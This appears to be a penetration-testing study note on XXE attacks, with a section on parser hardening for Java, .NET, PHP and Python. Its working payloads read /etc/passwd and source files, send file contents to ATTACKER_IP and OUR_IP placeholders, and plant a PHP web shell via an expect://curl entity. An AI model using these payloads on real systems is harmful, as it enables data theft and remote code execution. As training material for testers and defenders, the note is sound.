# In-Band XXE Exploitation
In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious [[XML]] payload to the application, and the server will respond with the extracted data or the result of the attack.
#### XML Entity Expansion

XML Entity Expansion is a technique often used in XXE attacks that involves defining entities within an XML document, which the XML parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-band XXE, as it allows attackers to inject malicious entities into the XML data. For example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

## Reading Sensitive Files

add```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
## Remote Code Execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.
If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

```shell-session
JoaoLaimer@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
JoaoLaimer@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
## Out-Of-Band XXE Exploitation
We can  create a DTD file that contains an external entity with a PHP filter to exfiltrate data from the target web application.

Save the sample DTD file below and name it as `sample.dtd`. The payload below will exfiltrate the contents of `/etc/passwd` and send the response back to the attacker-controlled server:

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```
Then we can send this XML request to get the contents of `/etc/passwd`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```
## Automated OOB Exfiltration

Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
## Server-Side Request Forgery + XXE
### Internal Network Scanning
Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```


### Avoiding Misconfigurations

Misconfigurations in XML parser settings are a common cause of XXE-related vulnerabilities. Adjusting these settings can significantly reduce the risk of XXE attacks. Below are detailed guidelines and best practices for several popular programming languages and frameworks.

### General Best Practices

1. **Disable External Entities and DTDs**: As a best practice, disable the processing of external entities and DTDs in your XML parsers. Most XXE vulnerabilities arise from malicious DTDs.
2. **Use Less Complex Data Formats**: Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.
3. **Allowlisting Input Validation**: Validate all incoming data against a strict schema that defines expected data types and patterns. Exclude or escape XML-specific characters such as <, >, &, ', and ". These characters are crucial in XML syntax and can lead to injection attacks if misused.

### Mitigation Techniques in Popular Languages

**Java**

Use the `DocumentBuilderFactory` and disable DTDs:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.NET**

Configure XML readers to ignore DTDs and external entities:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP**

Disable loading external entities by libxml:

```php
libxml_disable_entity_loader(true);
```

**Python**

Use `defusedxml` library, which is designed to mitigate XML vulnerabilities:

```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

### Regularly Update and Patch

- **Software Updates**: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.
- **Security Patches**: Regularly apply security patches to web applications and their environments.

### Security Awareness and Code Reviews

- **Conduct Code Reviews**: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.
- **Promote Security Training**: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.

## Advanced Exfiltration with CDATA
To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
After that, if we reference the `&joined;` entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`, so we will have to find a better way to do so.

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:

```xml
<!ENTITY joined "%begin;%file;%end;">
```
So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as follows:

```shell
$echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```
Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.
Now, we can call our external DTD script, and then reference the `error` entity, as follows:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Once we host our DTD script and send the above payload as our XML data (no need to include any other XML data), we will get the content of the `/etc/hosts`.
This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.
